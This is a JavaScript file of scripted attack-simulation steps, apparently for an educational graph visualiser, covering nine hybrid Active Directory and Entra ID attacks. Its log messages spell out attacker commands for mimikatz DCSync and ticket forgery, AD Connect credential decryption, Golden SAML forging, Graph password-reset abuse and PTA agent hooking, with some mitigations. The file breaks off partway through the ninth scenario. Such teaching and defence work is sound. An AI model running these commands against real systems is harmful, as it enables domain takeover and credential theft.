import { highlightElement, addTemporaryEdge } from '../graph.js';

// ── 1. AAD Connect Database — Credential Extraction ───────────────────────────
export const hybridAADConnectDumpScenario = [
  {
    scenarioName: "Attack: AAD Connect DB — Credential Extraction (MSOL_ + Cloud Sync Account)",
    logMessage: "Attacker Goal: Compromise AADConnect server to recover MSOL_<random> (on-prem DCSync rights) and AAD_<hash>@corp.onmicrosoft.com (cloud Directory.ReadWrite) service account credentials.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Attacker has local admin on hb_aadconnect (obtained via lateral movement from compromised WKSTN-HYB). Enumerating AADConnect installation: reg query HKLM\\SOFTWARE\\Microsoft\\AD Sync — confirms version + install path.",
    logType: "info",
    action: () => { highlightElement("hb_attacker"); addTemporaryEdge("hb_attacker", "hb_aadconnect", "smb", "Lateral → Local Admin"); },
  },
  {
    logMessage: "Query AADConnect SQL LocalDB: sqlcmd -S \"(localdb)\\.\\ADSync\" -d ADSync -Q \"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\". Returns: instance_id (GUID used as DPAPI entropy), keyset_id.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Query connector credentials table: sqlcmd -S \"(localdb)\\.\\ADSync\" -d ADSync -Q \"SELECT UPPER(ma_type), UPPER(username), encrypted_password FROM mms_management_agent WHERE ma_type='AD' OR ma_type='EXTENSIBLECONNECTIVITY2'\". Returns encrypted_password blobs.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Extract DPAPI encryption key as SYSTEM (required — machine-level DPAPI): PsExec64.exe -s -i cmd → whoami /priv confirms SeDebugPrivilege. Dump LSASS DPAPI master keys: mimikatz sekurlsa::dpapi.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Decrypt connector password blobs using DPAPI key + entropy (instance_id from DB): mimikatz dpapi::blob /masterkey:<dpapi_key> /in:<encrypted_blob> /entropy:<instance_id_hex>. Alternatively: DSInternals Get-ADSyncCredentials — automates all steps.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "RECOVERED: On-prem sync account: CORP\\MSOL_ab12cd3456ef — password in plaintext. This account has ACEs: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on DC=corp,DC=local. Equivalent to DCSync.",
    logType: "attack",
    action: () => { highlightElement("hb_msol"); highlightElement("hb_aadconnect"); },
  },
  {
    logMessage: "RECOVERED: Cloud sync account: Sync_aadsync_ab12cd34@corp.onmicrosoft.com — password in plaintext. This cloud SP has 'Directory Synchronization Accounts' role — can read all directory objects + write back selected attributes (passwords, etc.).",
    logType: "attack",
    action: () => { highlightElement("hb_aadconnect"); highlightElement("hb_entra"); },
  },
  {
    logMessage: "DUAL IMPACT: On-prem path — MSOL_ account enables DCSync → all domain hashes → Golden Ticket. Cloud path — cloud sync account enables MS Graph directory reads, password hash reads, and potential cloud admin manipulation.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_dc01", "attack-flow", "DCSync path"); addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "Cloud sync path"); },
  },
];

// ── 2. DCSync via MSOL_ Sync Account ─────────────────────────────────────────
export const hybridDCSyncViaMSOLScenario = [
  {
    scenarioName: "Attack: DCSync via MSOL_ Replication Account (Hybrid Privilege Abuse)",
    logMessage: "Attacker has MSOL_<random> account credentials (recovered from AADConnect DB). Verifying DCSync-capable ACEs before execution.",
    logType: "attack",
    action: () => { highlightElement("hb_attacker"); highlightElement("hb_msol"); },
  },
  {
    logMessage: "Verify replication ACEs: PowerShell → Get-ObjectAcl -DistinguishedName 'DC=corp,DC=local' | Where {$_.ActiveDirectoryRights -match 'Replication'} | Select IdentityReference, ActiveDirectoryRights. Confirms MSOL_ has: DS-Replication-Get-Changes ✓, DS-Replication-Get-Changes-All ✓.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "ldap", "ACE verification"),
  },
  {
    logMessage: "Attacker spawns process with MSOL_ credentials (pass-through, not stored in LSASS): runas /netonly /user:CORP\\MSOL_ab12cd3456ef cmd.exe. Network auth will use MSOL_ — local auth unchanged.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Execute DCSync via mimikatz (DRS/DRSUAPI — MS-DRSR §4.1.10): lsadump::dcsync /domain:corp.local /dc:dc01.corp.local /user:krbtgt. Initiates DRSUAPI RPC connection — DsBind() to DC01 from attacker's network context.",
    logType: "rpc",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "rpc", "DRSUAPI DsBind"),
  },
  {
    logMessage: "DC01: Receives DsBind from MSOL_ account. DRSUAPI IDL_DRSBind() — authenticates caller, issues DRS session handle. Verifies caller has DS-Replication-Get-Changes-All ACE → granted. No interactive logon — pure RPC over SMB/TCP 445.",
    logType: "rpc",
    action: () => highlightElement("hb_dc01"),
  },
  {
    logMessage: "mimikatz: IDL_DRSGetNCChanges() — requests replication of specific object attributes. Requesting: msDS-RevealedList, unicodePwd, supplementalCredentials, ntPwdHistory, lmPwdHistory for krbtgt.",
    logType: "rpc",
    action: () => addTemporaryEdge("hb_dc01", "hb_attacker", "rpc", "GetNCChanges"),
  },
  {
    logMessage: "EXTRACTED — krbtgt: NT Hash = <32 hex chars>, AES256 Key = <64 hex chars>, AES128 Key = <32 hex chars>. Also running: /user:Administrator → NT Hash + Kerberos keys for built-in Administrator.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Forge Golden Ticket: mimikatz kerberos::golden /user:Administrator /domain:corp.local /sid:<domain-SID> /krbtgt:<krbtgt-NT-hash> /id:500 /groups:512,518,519,520 /ptt. Ticket valid 10 years, forged in memory.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "IMPACT: Full on-prem domain compromise via Golden Ticket. Additionally — MSOL_ account's cloud counterpart (AAD_) grants read access to all Entra directory objects. Combined: full hybrid compromise (on-prem + cloud) sourced from AADConnect server.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_dc01", "attack-flow", "Golden Ticket DA"); addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "Cloud tenant read"); },
  },
];

// ── 3. AZUREADSSOACC$ Silver Ticket → Cloud Authentication Bypass ─────────────
export const hybridSSOSilverTicketScenario = [
  {
    scenarioName: "Attack: AZUREADSSOACC$ Silver Ticket — Cloud Authentication Bypass",
    logMessage: "Attacker Goal: Forge Kerberos Service Ticket for AZUREADSSOACC$ computer account → bypass Entra ID MFA → impersonate any synced cloud user. Requires: DA or MSOL_ DCSync to extract AZUREADSSOACC$ hash.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "DCSync AZUREADSSOACC$ machine account: lsadump::dcsync /domain:corp.local /user:AZUREADSSOACC$. Target: computer account created during Seamless SSO setup. Static Kerberos keys — NOT rotated by Netlogon (not a real computer, no machine account password change).",
    logType: "rpc",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "rpc", "DCSync AZUREADSSOACC$"),
  },
  {
    logMessage: "EXTRACTED: AZUREADSSOACC$ → NT Hash (RC4 key): <32 hex>, AES-256 key: <64 hex>. The AES-256 key is the SAME key synced to Entra ID by AADConnect — Entra uses it to decrypt Seamless SSO Kerberos tickets.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Identify target cloud user (high-privilege synced account): AzureHound or Graph API enumeration → find Global Admin or Application Admin with onPremisesSyncEnabled=true. Target: alice@corp.com (Entra admin, synced).",
    logType: "attack",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "Graph enum"),
  },
  {
    logMessage: "Forge Silver Ticket targeting Seamless SSO service: mimikatz kerberos::golden /user:alice@corp.com /domain:corp.local /sid:<domain-SID> /target:aadg.windows.net /service:HTTP /rc4:<AZUREADSSOACC$-NT-hash> /ptt. Note: /ptt injects into current session.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Silver Ticket PAC content (forged): UPN=alice@corp.com, SID=<alice-SID>, GroupSIDs=[Domain Users, Corp Admins], AccountControl=NORMAL_ACCOUNT. No TGT needed — Silver Ticket is self-signed with AZUREADSSOACC$ key, presented directly to service.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Attacker submits forged ticket to Seamless SSO endpoint: curl -H 'Authorization: Negotiate <base64-AP-REQ>' 'https://autologon.microsoftazuread-sso.com/corp.onmicrosoft.com/winauth/sso?client-request-id=<guid>&sso_nonce=<valid-nonce>&pullStatus=0'.",
    logType: "http",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "Forged AP-REQ"),
  },
  {
    logMessage: "Entra ID: Decrypts Silver Ticket with AZUREADSSOACC$ AES-256 key — success (Entra cannot distinguish forged vs legitimate ticket). Extracts UPN=alice@corp.com from PAC. Validates nonce (attacker fetched valid nonce first). Issues PRT + tokens.",
    logType: "attack",
    action: () => highlightElement("hb_entra"),
  },
  {
    logMessage: "IMPACT: Attacker holds PRT for alice@corp.com with no MFA. PRT can be used to silently obtain access tokens for all M365/Azure services. Since AZUREADSSOACC$ keys are static — ticket forgery possible for ALL synced users indefinitely until Seamless SSO is disabled or keys rotated.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_m365", "attack-flow", "Tenant access"); addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "PRT as alice"); },
  },
];

// ── 4. Golden SAML (ADFS Token-Signing Key Theft) ─────────────────────────────
export const hybridGoldenSAMLScenario = [
  {
    scenarioName: "Attack: Golden SAML — ADFS Token-Signing Certificate Theft",
    logMessage: "Attacker Goal: Steal ADFS private token-signing key → forge SAML 2.0 assertions for ANY user (incl. Global Admin) → authenticate to Entra ID as federated user bypassing all Entra controls including MFA.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Attacker targets ADFS01 (hb_adfs). ADFS stores its token-signing cert in one of two ways: (A) Windows Certificate Store on ADFS server (exportable or with DPAPI), (B) Distributed Key Manager (DKM) — key shards stored as AD object attributes under Program Data.",
    logType: "info",
    action: () => addTemporaryEdge("hb_attacker", "hb_adfs", "attack-flow", "Compromise ADFS"),
  },
  {
    logMessage: "Path A (DKM — most secure ADFS config): DKM master key stored in AD: LDAP query CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=local. Object class 'contact'. Attribute: thumbnailPhoto contains AES-256 master key (Base64-encoded). Attacker uses MSOL_ / DA LDAP read.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "ldap", "DKM key LDAP read"),
  },
  {
    logMessage: "DKM Key recovered: <256-bit AES key>. On ADFS host with local admin → run ADFSDump tool: ADFSDump.exe /domain:corp.local /dkmKey:<base64-DKM-key>. Decrypts and exports token-signing PFX from ADFS configuration database.",
    logType: "attack",
    action: () => highlightElement("hb_adfs"),
  },
  {
    logMessage: "Path B (Cert Store): On compromised ADFS host, export with: certutil -exportpfx -p 'P@ssword123' My <signing-cert-thumbprint> adfs-signing.pfx. OR dump via mimikatz: crypto::certificates /systemstore:LOCAL_MACHINE /store:MY /export.",
    logType: "attack",
    action: () => highlightElement("hb_adfs"),
  },
  {
    logMessage: "Identify target user ImmutableID (Base64 of on-prem objectGUID — maps Entra identity to SAML claim): Get-ADUser alice | Select-Object ObjectGUID → [System.Convert]::ToBase64String((Get-ADUser alice).ObjectGUID.ToByteArray()). Required for SAML NameID.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "ldap", "ImmutableID query"),
  },
  {
    logMessage: "Forge Golden SAML assertion using AADInternals: New-AADIntSAMLToken -ImmutableID '<base64-guid>' -Issuer 'https://adfs.corp.local/adfs/services/trust' -PfxFileName adfs-signing.pfx -PfxPassword 'P@ssword123' -UserPrincipalName globaladmin@corp.com. Generates signed SAML 2.0 Response XML.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Submit Golden SAML to the tenant's Entra federation sign-in endpoint under login.microsoftonline.com. Form body contains SAMLResponse=<base64-SAML-XML>. Entra verifies the signature against the registered ADFS signing certificate thumbprint — SIGNATURE VALID because the attacker used the real private key.",
    logType: "saml",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "saml", "Forged SAML POST"),
  },
  {
    logMessage: "Entra ID: SAML assertion trusted — Entra cannot distinguish forged from legitimate (both signed with real ADFS private key). Issues access_token + refresh_token for globaladmin@corp.com. NO MFA triggered — SAML is a federated trust assertion.",
    logType: "attack",
    action: () => highlightElement("hb_entra"),
  },
  {
    logMessage: "IMPACT: Full Entra tenant compromise as Global Admin. ADFS private key theft is persistent — until cert is rotated (ADFS cert rotation is rare, often 1-year or more). Attacker can forge tokens for any federated user indefinitely. Mitigation: move to Managed authentication (PHS/PTA) to remove ADFS dependency.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "Global Admin"); addTemporaryEdge("hb_attacker", "hb_m365", "attack-flow", "Tenant-wide access"); },
  },
];

// ── 5. Password Writeback Abuse — Cloud Admin → On-Prem DA Pivot ──────────────
export const hybridWritebackAbuseScenario = [
  {
    scenarioName: "Attack: Password Writeback Abuse — Cloud Global Admin → On-Premises Tier-0 Pivot",
    logMessage: "Attacker holds Entra Global Admin access (via PRT theft, token replay, or compromised MFA). Goal: leverage password writeback against a synced high-privilege on-prem account that is NOT protected by AdminSDHolder, then pivot deeper on-prem.",
    logType: "attack",
    action: () => { highlightElement("hb_attacker"); highlightElement("hb_entra"); },
  },
  {
    logMessage: "Enumerate synced candidates via Microsoft Graph: GET https://graph.microsoft.com/v1.0/users?$filter=onPremisesSyncEnabled eq true&$select=id,displayName,userPrincipalName,onPremisesSamAccountName. Then correlate them with privileged assignments from GET https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$expand=principal. Authorization: Bearer <stolen-access-token>.",
    logType: "msgraph",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "Graph user enum"),
  },
  {
    logMessage: "Identified: tier0-ops@corp.com — onPremisesSyncEnabled=true, onPremisesSamAccountName='tier0-ops'. This account is synced, has local admin on the AADConnect server and backup infrastructure, but is not in a protected AD group. That makes it a realistic writeback target; built-in protected groups often cannot be reset through writeback.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Attacker already knows this is a hybrid tenant with password writeback configured from prior admin knowledge or previous successful reset activity. There isn't a single clean public Microsoft Graph v1.0 boolean that definitively exposes all tenant writeback state in this attack path.",
    logType: "msgraph",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "Confirm writeback"),
  },
  {
    logMessage: "Admin password reset via Graph API: POST https://graph.microsoft.com/v1.0/users/tier0-ops@corp.com/authentication/methods/28c10230-6103-485e-b985-444c60001490/resetPassword. Body: {\"newPassword\": \"Attacker@NewP@ss1!\"}. Auth: Bearer <Global Admin token>.",
    logType: "attack",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "Admin reset API"),
  },
  {
    logMessage: "Entra ID: Request validated — caller is Global Admin, target is synced, and password writeback is enabled. The writeback service encrypts the new password and relays the reset request to the on-prem agent over the tenant-specific Service Bus channel.",
    logType: "sync",
    action: () => {
      addTemporaryEdge("hb_entra", "hb_aadconnect", "sync", "PasswordResetRequest");
      highlightElement("hb_entra");
    },
  },
  {
    logMessage: "AADConnect Writeback Agent: Receives and decrypts request, then performs the on-prem password set through the normal AD path. This is legitimate writeback infrastructure, so many environments alert weakly unless they correlate the originating Entra admin action.",
    logType: "ldap",
    action: () => { addTemporaryEdge("hb_aadconnect", "hb_dc01", "ldap", "AD password set"); highlightElement("hb_aadconnect"); },
  },
  {
    logMessage: "DC01: Password changed for CORP\\tier0-ops. Existing Kerberos TGTs remain valid until expiry, but new authentications now accept the attacker-chosen password immediately.",
    logType: "ldap",
    action: () => highlightElement("hb_dc01"),
  },
  {
    logMessage: "Attacker authenticates on-prem as the reset account: Impacket psexec.py CORP/tier0-ops:'Attacker@NewP@ss1!'@aadconnect.corp.local. Because tier0-ops is local admin on the sync host, the attacker lands on AADConnect and can continue to dump MSOL_ credentials or PTA material.",
    logType: "attack",
    action: () => addTemporaryEdge("hb_attacker", "hb_aadconnect", "smb", "PsExec to AADConnect"),
  },
  {
    logMessage: "IMPACT: Cloud Global Admin becomes a high-privilege on-prem foothold. In realistic environments this is usually a pivot into AADConnect, backup, PKI, or virtualization admin paths first; from there, full domain compromise is often one more step away. Mitigation: keep privileged on-prem identities out of sync scope and out of password-writeback scope.",
    logType: "attack",
    action: () => {
      addTemporaryEdge("hb_attacker", "hb_aadconnect", "attack-flow", "Tier-0 foothold");
      addTemporaryEdge("hb_attacker", "hb_dc01", "attack-flow", "Likely next step");
      highlightElement("hb_attacker");
      highlightElement("hb_aadconnect");
      highlightElement("hb_entra");
    },
  },
];

// ── 6. PTA Agent Credential Interception ─────────────────────────────────────
export const hybridPTAInterceptionScenario = [
  {
    scenarioName: "Attack: PTA Agent Compromise — Plaintext Credential Interception",
    logMessage: "Attacker Goal: Compromise PTA agent host (AADConnect server) → intercept decrypted plaintext credentials as they flow through the PTA authentication relay. All users authenticating via PTA are affected.",
    logType: "attack",
    action: () => { highlightElement("hb_attacker"); highlightElement("hb_aadconnect"); },
  },
  {
    logMessage: "Attacker has SYSTEM on AADConnect server (via DCSync → local admin password reuse, or direct lateral movement). Identify PTA agent: Get-Service -Name 'AzureADConnectAuthenticationAgentService' → State: Running. Binary: C:\\Program Files\\Microsoft Azure AD Connect Authentication Agent\\AzureADConnectAuthenticationAgent.exe.",
    logType: "info",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Locate PTA agent RSA private key in Windows Certificate Store: certutil -store My | findstr -i 'azure\\|pta'. The private key is non-exportable by default (CNG provider, CAPI2 ACL). However, with SYSTEM rights, memory extraction is possible.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Method 1 — Memory Hook (runtime interception): Inject into AzureADConnectAuthenticationAgent.exe process (SYSTEM). Hook target function: DecryptAuthenticationRequest() or the post-decryption callback in the authentication pipeline. MinHook / Detours API hooking.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Method 2 — Key Export (offline decryption): SYSTEM can override CAPI2 key ACLs. Export private key: use NCryptExportKey() API with NCRYPT_ALLOW_EXPORT_FLAG override. Dumps RSA-2048 private key to PEM/PFX. Can now decrypt any past/future captured Service Bus messages.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "PTA Authentication flow arrives: Entra ID encrypts {alice@corp.com, Corp@Summer2026!} with agent's RSA-2048 public key (OAEP-SHA1). Posts encrypted blob to Azure Service Bus tenant queue.",
    logType: "pta",
    action: () => addTemporaryEdge("hb_entra", "hb_aadconnect", "pta", "Encrypted auth req"),
  },
  {
    logMessage: "PTA Agent: Receives encrypted auth request from Service Bus. DecryptAuthenticationRequest() decrypts payload using RSA-2048 private key → {UPN='alice@corp.com', Password='Corp@Summer2026!'}. Hook/injection fires HERE — captures plaintext.",
    logType: "attack",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Attacker log capture: [2026-04-24 14:22:31] UPN=alice@corp.com PASS=Corp@Summer2026! RESULT=AUTH_REQUEST_SENT. [2026-04-24 14:23:05] UPN=bob@corp.com PASS=Winter2026$corp RESULT=AUTH_REQUEST_SENT. Every user authenticating via PTA is compromised.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "DC01 validation: PTA agent calls LDAP bind with captured plaintext → result returned → attacker also logs success/failure (distinguishes valid creds from typos). Comprehensive credential harvest in progress.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_aadconnect", "hb_dc01", "ldap", "LDAP cred validate"),
  },
  {
    logMessage: "IMPACT: All PTA-authenticated users' plaintext passwords captured. Attack is passive — no anomalous Entra/AD events generated (normal auth traffic). With stolen RSA private key, attacker can also passively decrypt Service Bus traffic from TLS termination point. Mitigation: PTA agent hosts are Tier-0 assets — treat equivalently to DCs. Require PAWs, monitor process injection, rotate PTA agent certificates regularly.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_dc01", "attack-flow", "Mass cred harvest"); addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "Cloud access all users"); },
  },
];

// ── 7. ImmutableID Soft/Hard Match — Cloud Account Takeover via Sync ──────────
export const hybridImmutableIDTakeoverScenario = [
  {
    scenarioName: "Attack: ImmutableID Manipulation — Sync-Based Cloud Account Takeover",
    logMessage: "Attacker Goal: Abuse AADConnect's identity matching logic to link an attacker-controlled on-prem account to a high-privilege cloud-only Entra account. After sync merge, on-prem password controls cloud authentication → full cloud account takeover.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has Domain Admin (or write access to mS-DS-ConsistencyGuid + userPrincipalName attributes on some on-prem account). Target: cloud-only Global Admin account 'cloudadmin@corp.com' (onPremisesSyncEnabled=false, not yet synced).",
    logType: "info",
    action: () => { highlightElement("hb_attacker"); highlightElement("hb_dc01"); },
  },
  {
    logMessage: "Step 1 — Retrieve target cloud account's ImmutableID: GET https://graph.microsoft.com/v1.0/users/cloudadmin@corp.com?$select=onPremisesImmutableId,userPrincipalName,id (attacker has any read Graph access). ImmutableID = Base64(objectGUID of account). Returns: onPremisesImmutableId: 'AAABBB...==' (28 chars Base64).",
    logType: "msgraph",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "GET /users ImmutableID"),
  },
  {
    logMessage: "Step 2 — Decode ImmutableID to GUID bytes: [System.Convert]::FromBase64String('AAABBB...==') → byte[16]. This is the exact objectGUID of the target cloud account. AADConnect uses mS-DS-ConsistencyGuid (if set) or objectGUID bytes (Base64) as ImmutableID for hard match.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Step 3 — Set mS-DS-ConsistencyGuid on attacker-controlled on-prem account: Set-ADUser 'corp_svc_backup' -Replace @{'mS-DS-ConsistencyGuid' = [byte[]](0xAA,0xAA,0xBB,...)}. This tells AADConnect: this on-prem account's cloud identity is the account with ImmutableID 'AAABBB...=='.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "ldap", "Set mS-DS-ConsistencyGuid"),
  },
  {
    logMessage: "Step 4 — UPN alignment (soft match reinforcement): Set-ADUser 'corp_svc_backup' -UserPrincipalName 'cloudadmin@corp.com'. AADConnect's soft match also keys on UPN. Hard match (ImmutableID) takes precedence — even if UPN differs, the ImmutableID match forces the merge.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "ldap", "Set UPN match"),
  },
  {
    logMessage: "Step 5 — Trigger AADConnect delta sync: Start-ADSyncSyncCycle -PolicyType Delta (run from AADConnect server or wait 30 min). AADConnect LDAP-polls DC, finds corp_svc_backup with mS-DS-ConsistencyGuid='AAABBB...=='. Looks up Entra cloud object by ImmutableID → matches cloudadmin@corp.com.",
    logType: "sync",
    action: () => addTemporaryEdge("hb_aadconnect", "hb_dc01", "ldap", "DirSync — detect ImmutableID"),
  },
  {
    logMessage: "AADConnect: Hard match found — on-prem corp_svc_backup → cloud cloudadmin@corp.com. Writes onPremisesSyncEnabled=true on cloud object. Merges on-prem attributes into cloud account. If PHS enabled: cloud password hash updated from on-prem corp_svc_backup password. Cloud account now controlled by on-prem identity.",
    logType: "sync",
    action: () => addTemporaryEdge("hb_aadconnect", "hb_entra", "sync", "ImmutableID merge"),
  },
  {
    logMessage: "Step 6 — Cloud account takeover: Attacker knows corp_svc_backup's on-prem password. PHS delivers the NT hash-derived hash to Entra. Attacker authenticates to Entra as cloudadmin@corp.com using corp_svc_backup's password → valid! Cloud GA session obtained.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_entra", "oidc", "auth as cloudadmin"); highlightElement("hb_entra"); },
  },
  {
    logMessage: "DETECTION: Entra Audit Log: 'Update user — onPremisesSyncEnabled changed to true' on a previously cloud-only admin account is a critical alert signal. Microsoft DART recommends alerting on any sync enablement change on privileged accounts. Mitigation: Exclude all cloud privileged admin accounts from AADConnect sync scope (scoping filter by OU or attribute). Use separate cloud-only admin accounts never synced.",
    logType: "info",
    action: () => highlightElement("hb_entra"),
  },
  {
    logMessage: "IMPACT: Any on-prem Domain Admin can silently take over any cloud-only Entra account — including Break Glass Global Admins — if those accounts fall within the AADConnect sync scope. The ImmutableID is non-secret and typically exposed to accounts with ordinary directory-read access. Complete cloud/on-prem security boundary collapse via sync engine. This attack requires NO cloud credentials initially.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "GA takeover via sync"); highlightElement("hb_m365"); },
  },
];

// ── 8. Cloud Kerberos Trust — krbtgt_AzureAD$ Key Compromise ─────────────────
export const hybridCloudKerberosForgeScenario = [
  {
    scenarioName: "Attack: Cloud Kerberos Trust — krbtgt_AzureAD$ Key Theft → Cloud TGT Forgery",
    logMessage: "Attacker Goal: Extract the krbtgt_AzureAD$ account's Kerberos keys from on-prem AD. This account backs the Cloud Kerberos Trust — with its keys, attacker forges Cloud TGTs that on-prem DCs accept as proof of Entra authentication → full on-prem TGT issuance for any user without credentials.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Background: When Cloud Kerberos Trust is configured, AADConnect creates krbtgt_AzureAD$ — an RODC-style account in on-prem AD. Entra ID holds the corresponding Kerberos service key (AES-256). Cloud TGTs are signed by Entra using this key. On-prem DC validates Cloud TGTs by decrypting with krbtgt_AzureAD$'s local copy.",
    logType: "info",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
    logMessage: "Attacker (Domain Admin or MSOL_ DCSync): DCSync krbtgt_AzureAD$ account: lsadump::dcsync /domain:corp.local /user:krbtgt_AzureAD$. Returns: NT hash + AES-256 key + AES-128 key. The AES-256 key is the critical Kerberos service key shared with Entra.",
    logType: "rpc",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "rpc", "DCSync krbtgt_AzureAD$"),
  },
  {
    logMessage: "EXTRACTED: krbtgt_AzureAD$ — AES-256: <64 hex chars>. This is the exact key Entra uses to issue Cloud TGTs and that on-prem DCs use to validate them. With this key, attacker can forge Cloud TGTs for ANY user.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Forge Cloud TGT (partial TGT, RODC-style): Use Impacket or modified ticketer to create Kerberos TGT encrypted with krbtgt_AzureAD$ AES-256 key. Structure: AS-REP body, client=alice@corp.com, realm=corp.local, startTime=now, endTime=+10h, session key=random AES-256. Encrypted with krbtgt_AzureAD$ AES256.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Present forged Cloud TGT to on-prem DC01: craft AS-REQ with PADATA=KERB-KEY-LIST-REQ containing the forged Cloud TGT. DC01 processes the request — identifies Cloud Kerberos Trust ticket, decrypts using krbtgt_AzureAD$ local key. Decryption succeeds (attacker forged with same key).",
    logType: "kerberos",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "kerberos", "Forged Cloud TGT → AS-REQ"),
  },
  {
    logMessage: "DC01: Cloud TGT validated — PAC contains alice@corp.com identity, group memberships, SIDs. DC issues full on-prem TGT for alice@corp.com (encrypted with regular krbtgt key). No password required, no Entra auth consulted, no MFA triggered.",
    logType: "kerberos",
    action: () => addTemporaryEdge("hb_dc01", "hb_attacker", "kerberos", "Full on-prem TGT issued"),
  },
  {
    logMessage: "Attacker requests TGS for target on-prem services using the full TGT: klist → TGT for alice@corp.local. Request TGS for cifs/dc01.corp.local → access SYSVOL, NETLOGON. Request TGS for host/dc01.corp.local → PSExec / WinRM as alice@corp.com on DC. All without knowing alice's password.",
    logType: "kerberos",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "kerberos", "TGS for CIFS/host"),
  },
  {
    logMessage: "Forge for ANY user: repeat for Administrator@corp.com, krbtgt@corp.com, any DA. The krbtgt_AzureAD$ key doesn't change unless Cloud Kerberos Trust is disabled and re-provisioned (same as AZUREADSSOACC$ — static keys, rare rotation). Persistent attack capability until key rotation.",
    logType: "attack",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "attack-flow", "Forge TGT → any user on-prem"),
  },
  {
    logMessage: "IMPACT: Cloud Kerberos Trust trades on-prem dependency for cloud dependency — but a single compromise of krbtgt_AzureAD$ breaks the entire trust. On-prem full DA access without any credential, for any user, indefinitely. Mitigation: Rotate krbtgt_AzureAD$ key regularly (run Update-AzureADKerberosServer from AADConnect server), monitor DCSync operations targeting krbtgt_AzureAD$ specifically.",
    logType: "attack",
    action: () => { highlightElement("hb_dc01"); highlightElement("hb_attacker"); },
  },
];

// ── 9. Group Writeback Abuse — Cloud Group Member → On-Premises Access ────────
export const hybridGroupWritebackAbuseScenario = [
  {
    scenarioName: "Attack: Cloud Group Writeback Abuse — Entra Cloud Sync → On-Premises Privilege",
    logMessage: "Attacker Goal: Abuse cloud-managed groups that are provisioned back to on-prem AD, adding an attacker-controlled identity to a written-back security group and inheriting on-prem access from its nesting or ACLs.",
    logType: "attack",
    action: () => highlightElement("hb_attacker"),
  },
  {
    logMessage: "Background: Microsoft now recommends group writeback through Entra Cloud Sync. Group Writeback V2 in Entra Connect Sync was deprecated and unsupported as of August 6, 2025. The attack concept is still real because cloud-managed groups can still be provisioned into AD and then nested into sensitive on-prem access paths.",
    logType: "info",
    action: () => highlightElement("hb_aadconnect"),
  },
  {
